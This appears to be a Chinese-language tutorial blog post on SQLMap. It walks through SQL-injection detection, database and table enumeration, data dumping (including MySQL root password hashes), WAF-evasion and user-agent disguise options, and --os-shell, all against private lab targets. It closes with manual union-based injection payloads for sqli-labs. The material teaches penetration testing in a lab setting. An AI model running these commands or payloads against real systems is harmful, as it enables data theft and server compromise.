---
title: "SQLMap 使用指南"
permalink: sqlmap-usage-guide/
date: 2025-12-03 05:26:48
categories:
  - 网络安全
  - Web 安全
tags:
  - SQLMap
  - SQL注入
  - 工具
img: /medias/featureimages/7.jpg
summary: "SQLMap 从安装、探测到脱库的常用参数与实战用法，包括 tamper、级别调整与常见问题。"
---

<!-- more -->

## 安装
[https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

```plain
git clone https://github.com/sqlmapproject/sqlmap.git
python sqlmap.py
```

 ⚠️ ：如果使用 kali 的自带的sqlmap ，则**不需要**输入 python sqlmap.py **直接输入 sqlmap 即可使用**

## 查看帮助信息
```plain
python sqlmap.py -h  查看部分帮助信息
python sqlmap.py -hh 查看全部帮助信息
```

## 使用流程
## 1 检测 SQL 注入
```plain
 python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
 ⚠：-u 是指 URL
```

## 2 获取基础信息
### --current-db:获取当前数据库
```plain
--current-db:获取当前数据库
python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1 --current-db
```

### --current-user: 获取当前用户
```plain
--current-user: 获取当前用户
python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1 --current-user
```

### --banner: 获取mysql 版本
```plain
--banner: 获取mysql 版本
python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1 --banner
```

### --is-dba: 判断当前用户是否是管理员
```plain
--is-dba: 判断当前用户是否是管理员
python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1 --is-dba
```

## 3 获取数据库名
### --dbs : 获取所有的数据库名
```plain
--dbs : 获取所有的数据库名
python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1 --dbs
```

## 4 获取表名

python sqlmap.py -r 121.txt -D weibo -T flag --dump

### -D : 获取数据库名
### --tables：获取表名
```plain
-D : 获取数据库名
--tables：获取表名

python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
-D school --tables

python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
-D 数据库名 --tables
```

## 5 获取列名
### -T : 指定数据库的表名
### --columns ；获取列名
```plain
-T : 指定数据库的表名
--columns ；获取列名

python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
-D school -T flag --columns

python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
-D 数据库名 -T 表名 --columns
```

## 6 获取数据
### -C : 获取列名，如果有 多个列名，以逗号分隔
### --dump ；获取数据
```plain
-C : 获取列名，如果有 多个列名，以逗号分隔
--dump ；获取数据

python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
-D school -T students -C name,score --dump

python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
-D 数据库 -T 表名 -C 列名1,列名2 --dump
```

### 也可以不使用 -C 指定列名，直接获取所有数据
```plain
也可以不使用 -C 指定列名，直接获取所有数据

 python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
 -D school -T students  --dump
```

## 使用sqlmap 找出mysql root 用户的密码hash
```plain
python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
-D mysql -T user --columns
```

```plain
 python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
 -D mysql -T user -C host,user,authentication_string --dump
```

## 获取flag值
```plain
python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
-D school -T flag --dump
```

## 常用选项
## 1 清除缓存
### --flush-session  清除sqlmap留下的缓存
```plain
--flush-session  清除sqlmap留下的缓存

python sqlmap.py -u http://192.168.79.120/string_sqli.php?student_id=1
-D school -T flag --dump --flush-session
```

## 2 指定 POST 请求体
### --data 指定请求体
```plain
--data 指定请求体
sqlmap -u http://192.168.79.120/boolean_sqli.php --data="student_id=20210101"
```

## 3 指定请求报文
### -r 请求报文文件路径
```plain
-r 请求报文文件路径
sqlmap -r /root/sql/1.txt
```

## 4 默认 无交互运行
### --batch   sqlmap 不再询问，Y/n，直接保持默认运行
```plain
--batch   sqlmap 不再询问，Y/n，直接保持默认运行
sqlmap -r /root/sql/1.txt --batch
```

## 5 指定数据库的类型
sqlmap 支持的 dbms 很多，不仅有 mysql, sqlmap 默认情况下会尝试dbms 是哪个，也可以是用

### --dbms 指定
```plain
python sqlmap.py -r /home/yu/sqlmap/1.txt --dbms mysql
```

```plain
--dbms mysql
--dbms mssql
--dbms pgsql
--dbms oracle
--dbms access
--dbms sqlite
```

```plain
python sqlmap.py -r /home/yu/sqlmap/1.txt --dbms oracle --batch
```

## 6 指定 想测试的 参数
### -p  参数名
```plain
-p  参数名
sqlmap -r /root/sql/1.txt -p student_id
```

## 7 指定 cookie
### --cookie
```plain
--cookie
```

```plain
需要登录才能打的漏洞，称为后台漏洞
不需要登录就能打的漏洞，称为前台漏洞
如后台 SQL注入、前台SQL注入
危害： 前台漏洞 > 后台漏洞
数量： 后台漏洞 > 前台漏洞
```

```plain
 python sqlmap.py -u "http://192.168.79.120:81/vulnerabilities/sqli/?id=2&Submit
 =Submit#" --cookie ="PHPSESSID=umnbn94se9v9b27li7fq7h9242; security=low"

```

## 8 指定利用方式
### --tech 强制让 sqlmap  使用一种利用方式
```plain
--tech B   布尔盲注
--tech E   报错注入
--tech U	 联合查询
--tech S   堆叠注入
--tech T	 时间盲注
--tech Q	 内联查询
```

```plain
python sqlmap.py -u "http://192.168.79.120:81/vulnerabilities/sqli_blind/?id=9
&Submit=Submit#" --cookie ="PHPSESSID=umnbn94se9v9b27li7fq7h9242;
security=low" --dbs --tech B
```

## 9 显示攻击过程详细信息
### -v
```plain
-v
-v 0	不显示信息，只显示结果
-v 1	默认
-v 2	显示调试信息
-v 3	显示攻击过程
```

## 10  测试等级
### --level
```plain
--level
--level 1 默认，测试GET参数或POST参数
--level 2 在level1的基础上，测试Cookie注入
--level 3 在level2的基础上，测试UA、referer 等常见请求头注入
--level 4/5 完整检测、检测所有的请求头
```

## 11  风险等级
###  --risk
```plain
--risk
--risk 1 默认
--risk 2 有风险的测试，会大量使用 or 和 sleep
--risk 3 大量测试 delete 、 insert 、update 的注入
```

## 12  随机UA
### --random-agent
默认的sqlmap 请求头的 User-agent 中会携带 sqlmap 的特征和版本号

```plain
python sqlmap.py -u "http://192.168.2.50:8081/vulnerabilities/sqli/?
id=1&Submit=Submit#" --cookie="PHPSESSID=fooj3nvc6qfm09kb88knsol3a5;
security=low" --dbs --flush-session --random-agent
```

## 13 代理
### --proxy
```plain
python sqlmap.py -u "https://www.google.com" --proxy=socks5://127.0.0.1:7897
```

## 其他选项
### 1  指定前缀(闭合)
#### --prefix
```plain
--prefix
--prefix="'" 指定闭合为 '
--prefix='")' 指定闭合为 ")
```

### 2  指定后缀 （注释）
#### --suffix
```plain
--suffix
--suffix='-- ' 指定后缀为--空格
```

### 3  绕过waf
#### --tamper 脚本名

### 4  获取系统命令行权限 getshell
大部分情况都会失败

#### --os-shell
```plain
python sqlmap.py -u "http://192.168.79.120:81/vulnerabilities/sqli/?id=2&Submit=Submit#"  -batch --os-shell
```

## 其他
```plain
-g GOOGLEDORK 谷歌黑客语法
--auth-type 指定认证方式，如http basic
--tor tor洋葱网络
```

## 靶场： sqlilabs
docker 搭建

```plain
docker run -d -p 8082:80 --name sqlilabs acgpiano/sqli-labs
```

安装数据库

判断是否有SQL注入

有哪些数据库

判断当前数据库名

判断当前用户

--is-dba : 判断当前数据库用户是否为管理员

判断数据库中的表名

判断数据库中的表的列名

找列中的数据

[http://192.168.79.120:8082/Less-1/?id=](http://192.168.79.120:8082/Less-1/?id=1%27)1'

[http://192.168.79.120:8082/Less-1/?id=1'](http://192.168.79.120:8082/Less-1/?id=1') and 1=1 -- -

[http://192.168.79.120:8082/Less-1/?id=-1'](http://192.168.79.120:8082/Less-1/?id=-1') order by 4 -- -

[http://192.168.79.120:8082/Less-1/?id=-1'](http://192.168.79.120:8082/Less-1/?id=-1') order by 3 -- -

[http://192.168.79.120:8082/Less-1/?id=-1'](http://192.168.79.120:8082/Less-1/?id=-1') union select 1,2,group_concat(schema_name) from information_schema.schemata -- -

[http://192.168.79.120:8082/Less-1/?id=-1'](http://192.168.79.120:8082/Less-1/?id=-1') union select 1,2,database() -- -

[http://192.168.79.120:8082/Less-1/?id=-1'](http://192.168.79.120:8082/Less-1/?id=-1') union select 1,2,user() -- -

[http://192.168.79.120:8082/Less-1/?id=-1'](http://192.168.79.120:8082/Less-1/?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- -

[http://192.168.79.120:8082/Less-1/?id=-1'](http://192.168.79.120:8082/Less-1/?id=-1') union select 1,group_concat(column_name) ,2 from information_schema.columns where table_schema='security' and table_name='users' -- -

[http://192.168.79.120:8082/Less-1/?id=-1'](http://192.168.79.120:8082/Less-1/?id=-1') union select 1,group_concat(password) ,2 from security.users -- -
